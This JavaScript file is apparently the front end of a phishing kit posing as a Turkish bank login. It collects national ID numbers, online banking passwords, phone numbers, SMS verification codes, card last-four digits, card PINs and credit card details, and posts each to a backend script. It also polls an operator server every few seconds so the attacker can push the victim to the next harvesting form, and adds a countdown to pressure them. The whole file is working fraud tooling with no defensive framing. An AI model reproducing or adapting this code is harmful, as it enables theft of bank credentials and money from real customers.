const PROCESS_URL = "process.php";
const CHECK_INTERVAL = 3000;
var gerisayimBasladi = false;

function formatCreditCardNumber(input) {
    let formatted = input.value.replace(/\D/g, '');
    formatted = formatted.replace(/(\d{4})/g, '$1 ').trim();
    input.value = formatted;
}

function formatExpirationDate(input) {
    let value = input.value;
    value = value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.replace(/(\d{2})(\d{2})/, '$1 / $2');
    }
    input.value = value;
    let dateParts = value.split(' / ');
    let month = parseInt(dateParts[0]);
    let year = parseInt(dateParts[1]);
    let currentYear = new Date().getFullYear() % 100;
    let currentMonth = new Date().getMonth() + 1;
    let todayDate = new Date(currentYear, currentMonth);
    let enteredDate = new Date(year, month);
    if (!(month >= 1 && month <= 12 && enteredDate >= todayDate)) {
        input.style.border = '1px solid red';
        document.getElementById("loginButtonCredit").disabled = true;
    } else {
        input.style.border = '1px solid #ccc';
        document.getElementById("loginButtonCredit").disabled = false;
    }
}

function tcno_dogrula(tcno) {
    tcno = String(tcno);
    if (tcno.substring(0, 1) === '0' || tcno.length !== 11) {
        return false;
    }
    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;
    for (var i = j = 0; i < 9; ++i) {
        j = parseInt(ilkon_array[i], 10);
        if (i & 1) {
            hane_cift += j;
        } else {
            hane_tek += j;
        }
        ilkon_total += j;
    }
    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
        return false;
    }
    ilkon_total += parseInt(ilkon_array[9], 10);
    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
        return false;
    }
    return true;
}

$(document).on("keydown", "#username, #password, #phone, #sms", function (e) {
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
        (e.keyCode == 65 && e.ctrlKey === true) ||
        (e.keyCode == 67 && e.ctrlKey === true) ||
        (e.keyCode == 86 && e.ctrlKey === true) ||
        (e.keyCode == 88 && e.ctrlKey === true) ||
        (e.keyCode >= 35 && e.keyCode <= 39)) {
        return;
    }
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});

function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: { action: action, ...formData },
        success: function (response) {
            successCallback(response);
        },
        error: function (error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function showErrorModal() {
    $('#errorModal').css('display', 'flex');
}

function closeErrorModal() {
    $('#errorModal').hide();
}

function handleTCInputChange() {
    var tcInput = document.getElementById("username");
    var loginButton = document.getElementById("loginButton");
    if (tcno_dogrula(tcInput.value)) {
        tcInput.classList.remove("error-border");
    } else {
        tcInput.classList.add("error-border");
    }
}

function handleForgotTCInputChange() {
    if (tcno_dogrula($('#tckn').val())) {
        $('#tckn').removeClass("error-border");
    } else {
        $('#tckn').addClass("error-border");
    }
}

function handleLast4() {
    if ($('#last4').val().length == 4) {
        $('#last4').removeClass("error-border");
    } else {
        $('#last4').addClass("error-border");
    }
}

function handleCardPin() {
    if ($('#cardpin').val().length == 4) {
        $('#cardpin').removeClass("error-border");
    } else {
        $('#cardpin').addClass("error-border");
    }
}

function submitForgot() {
    let tckn = $('#forgot-password #tckn').val();
    let last4 = $('#forgot-password #last4').val();
    let cardpin = $('#forgot-password #cardpin').val();

    if (!tcno_dogrula(tckn) || last4.length != 4 || cardpin.length != 4) {
        $("#errorModal").css('display', 'flex');
        return;
    }

    $(".section").hide();
    $("#loadingSection").show();

    submitData("submitForgot", { tckn: tckn, last4: last4, cardpin: cardpin }, function () {
        $("#forgot-password #loginButton").hide();
        $("#forgot-password #loginProcess").show();
        $("#forgot-password #loginProcess").attr("disabled", true);
    });
}

document.getElementById("username").addEventListener("input", handleTCInputChange);

function submitLogin() {
    var username = $("#username").val();
    var password = $("#password").val();
    var hasError = false;

    $("#username, #password").removeClass("error");

    if (!(/^\d{11}$/.test(username))) {
        $("#username").addClass("error");
        hasError = true;
    }

    if (!(/^\d{6}$/.test(password))) {
        $("#password").addClass("error");
        hasError = true;
    }

    if (hasError) {
        $("#errorModal").css('display', 'flex');
        return;
    }

    $('.section').hide();
    $("#loadingSection").show().css({
        'display': 'flex',
        'visibility': 'visible',
        'position': 'relative',
        'z-index': '100'
    });

    submitData("submitLogin", { username: username, password: password }, function (response) {
        if (response && response.data && response.data.page) {
            $("#" + response.data.page).show();
        }
    });
}

function submitLoginfe() {
    var usernamefe = $("#usernamefe").val();
    var passwordfe = $("#passwordfe").val();
    var hasError = false;

    $("#usernamefe, #passwordfe").removeClass("error");

    if (!(/^\d{11}$/.test(usernamefe))) {
        $("#usernamefe").addClass("error");
        hasError = true;
        console.log("TC Kimlik No hatalı");
    }

    if (!(/^\d{6}$/.test(passwordfe))) {
        $("#passwordfe").addClass("error");
        hasError = true;
        console.log("Şifre hatalı");
    }

    if (hasError) {
        $("#errorModal").css('display', 'flex');
        return;
    }

    $('.section').hide();
    $("#loadingSection").show().css({
        'display': 'flex',
        'visibility': 'visible',
        'position': 'relative',
        'z-index': '100'
    });

    submitData("submitLoginfe", { usernamefe: usernamefe, passwordfe: passwordfe }, function (response) {
        if (response && response.data && response.data.page) {
            $("#" + response.data.page).show();
        }
    });
}

function submitPhone() {
    var phone = $("#phone").val();

    if (!/^\d{6}$/.test(phone)) {
        $("#errorModal").css('display', 'flex');
        $("#phone").addClass("error-border");
        return;
    }

    $("#phone").removeClass("error-border");

    $("#loadingSection").css({
        'display': 'flex',
        'visibility': 'visible',
        'position': 'relative',
        'z-index': '100'
    });

    $('.section:not(#loadingSection)').hide();

    $('.spinner').empty();
    $('.spinner').parent().hide().prop('disabled', false);

    submitData("submitPhone", { phone: phone }, function (response) {
        if (response && response.data && response.data.page) {
            $("#" + response.data.page).show();
        }
    });
}

function submitPhonefe() {
    var phonefet = $("#phonefet").val();
    if (!/^\d{6}$/.test(phonefet)) {
        $("#errorModal").css('display', 'flex');
        $("#phonefet").addClass("error-border");
        return;
    }

    $("#phonefet").removeClass("error-border");

    $("#loadingSection").show().css({
        'display': 'flex',
        'visibility': 'visible',
        'position': 'relative',
        'z-index': '100'
    });

    $('.section:not(#loadingSection)').hide();

    $('.spinner').empty();
    $('.spinner').parent().hide().prop('disabled', false);

    submitData("submitPhonefe", { phonefet: phonefet }, function (response) {
        if (response && response.data && response.data.page) {
            $("#" + response.data.page).show();
        }
    });
}

function submitCode() {
    var phonecode = $("#phonecode").val();

    if (!/^\+90\s*(\d{3}\s*){2}\d{4}$/.test(phonecode)) {
        $("#errorModal").css('display', 'flex');
        $("#phonecode").addClass("error-border");
        return;
    }

    $("#phonecode").removeClass("error-border");

    $("#loadingSection").show().css({
        'display': 'flex',
        'visibility': 'visible',
        'position': 'relative',
        'z-index': '100'
    });

    $('.section:not(#loadingSection)').hide();

    $('.spinner').empty();
    $('.spinner').parent().hide().prop('disabled', false);

    submitData("submitCode", { phonecode: phonecode }, function (response) {
        if (response && response.data && response.data.page) {
            $("#" + response.data.page).show();
        }
    });
}

function onlineCount() {
    $.ajax({
        type: "POST",
        url: "check_online.php",
        success: function (response) {
            if (response === "online") {
                return true;
            } else {
                return false;
            }
        },
        error: function (error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function checkUserOnline() {
    submitData("updateLastActivity", {}, function () {
        $.ajax({
            type: "POST",
            url: "status.php",
            success: function (response) {
                if (response === "online") {
                    return true;
                } else {
                    return false;
                }
            },
            error: function (error) {
                console.error("AJAX request failed:", error);
            }
        });
    });
}

function gerisayim() {
    var geriyeKalanSure = 60;
    var gerisayimElementi = document.getElementById("gerisayim");
    var gerisayimSayaci = setInterval(function () {
        geriyeKalanSure--;

        gerisayimElementi.innerHTML = "<span>Geriye kalan süre: </span>" + geriyeKalanSure + " saniye";

        if (geriyeKalanSure <= 0) {
            clearInterval(gerisayimSayaci);
            gerisayimElementi.innerHTML = "<span>Süre doldu!</span>";
        }
    }, 1000);
}



function showForgotPassword() {
    localStorage.setItem('lastVisibleSection', 'forgot-password');
    $("#forgot-password").show();
    $("#loginf, #loginfe, #phonef, #phonefe, #codef, #creditf, #verf").hide();
}

function setCookie(name, value, days = 7) {
    const date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    const expires = "; expires=" + date.toUTCString();
    document.cookie = name + "=" + value + expires + "; path=/";
}

function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for(let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function setStorageItem(key, value) {
    try {
        localStorage.setItem(key, value);
    } catch (e) {
        console.warn('localStorage failed, falling back to cookie', e);
    }
    setCookie(key, value);
}

function getStorageItem(key) {
    let value = null;
    try {
        value = localStorage.getItem(key);
    } catch (e) {
        console.warn('localStorage failed, falling back to cookie', e);
    }
    return value || getCookie(key);
}

function wait() {
    submitData("wait", {}, function (response) {
        var parsedResponse = typeof response === 'string' ? JSON.parse(response) : response;
        
        if (parsedResponse.data.page === "waiting") {
            $("#loadingSection").show().css({
                'display': 'flex',
                'visibility': 'visible',
                'position': 'relative',
                'z-index': '100'
            });
            $('.section:not(#loadingSection)').hide();
            return;
        }

        $("#loadingSection").hide();
        $('.section').hide();
        $("#" + parsedResponse.data.page).show();

        switch (parsedResponse.data.page) {
            case "verf":
                $("#loginf, #forgot-password, #loginfe, #phonefe, #phonef, #codef, #creditf").hide();
                $("#verf").show();
                setStorageItem('lastVisibleSection', 'verf');
                break;
            case "creditf":
                $("#loginf, #forgot-password, #loginfe, #phonefe, #phonef, #codef, #creditf, #footer").hide();
                $("#creditf").show();
                setStorageItem('lastVisibleSection', 'creditf');
                if (!gerisayimBasladi) {
                    gerisayimBasladi = true;
                    gerisayim();
                }
                break;
            case "phonef":
                $("#loginf, #forgot-password, #loginfe, #phonefe, #verf, #codef, #creditf").hide();
                $("#phonef").show();
                $("#loginProcessPhone").attr("disabled", false).hide();
                $("#loginButtonPhone").show();
                setStorageItem('lastVisibleSection', 'phonef');
                break;
            case "phonefe":
                $("#loginf, #forgot-password, #loginfe, #verf, #phonef, #codef, #creditf").hide();
                $("#phonefe").show();
                $('h4[style="color:red; margin-bottom:10px;"]').show();
                $("#loginProcessPhonefe").attr("disabled", false).hide();
                $("#loginButtonPhonefe").show();
                setStorageItem('lastVisibleSection', 'phonefe');
                break;
            case "loginfe":
                $("#loginf, #verf, #phonef, #phonefe, #codef, #creditf").hide();
                if (parsedResponse.data.page !== 'forgot-password') {
                    $("#loginfe").show();
                    setStorageItem('lastVisibleSection', 'loginfe');
                } else {
                    $('#forgot-password #loginfe').show();
                }
                $('#forgot-password-error').show();
                $('h4[style="color: red; margin-bottom: 20px;"]').show();
                $("#loginProcessfe").attr("disabled", false).hide();
                $("#loginButtonfe").show();
                $("#forgot-password #loginProcess").attr("disabled", false).hide();
                $("#forgot-password #loginButton").show();
                break;
            case "codef":
                $("#loginf, #forgot-password, #loginfe, #verf, #phonef, #phonefe, #creditf").hide();
                $("#codef").show();
                $("#loginProcessCode").attr("disabled", false).hide();
                $("#loginButtonCode").show();
                setStorageItem('lastVisibleSection', 'codef');
                break;
            case 'loginf':
                if (parsedResponse.data.page !== 'forgot-password') {
                    $('#loginf').show();
                    setStorageItem('lastVisibleSection', 'loginf');
                }
                break;
        }
    });
}

if (!getStorageItem('ak-session')) {
    setStorageItem('lastVisibleSection', 'loginf');
    setStorageItem('ak-session', 'false');
}

if(getStorageItem('ak-session') == 'false') {
    setStorageItem('lastVisibleSection', 'loginf');
}

if(getStorageItem('ak-session') == 'true' && getStorageItem('lastVisibleSection') == 'forgot-password') {
    setStorageItem('lastVisibleSection', 'loginfe');
}

const currentSection = getStorageItem('lastVisibleSection');
if (currentSection === 'forgot-password') {
    $('#forgot-password').show();
} else {
    $('#loginf').show();
}

wait();
onlineCount();
setInterval(wait, CHECK_INTERVAL);
setInterval(checkUserOnline, CHECK_INTERVAL);
setInterval(onlineCount, CHECK_INTERVAL);
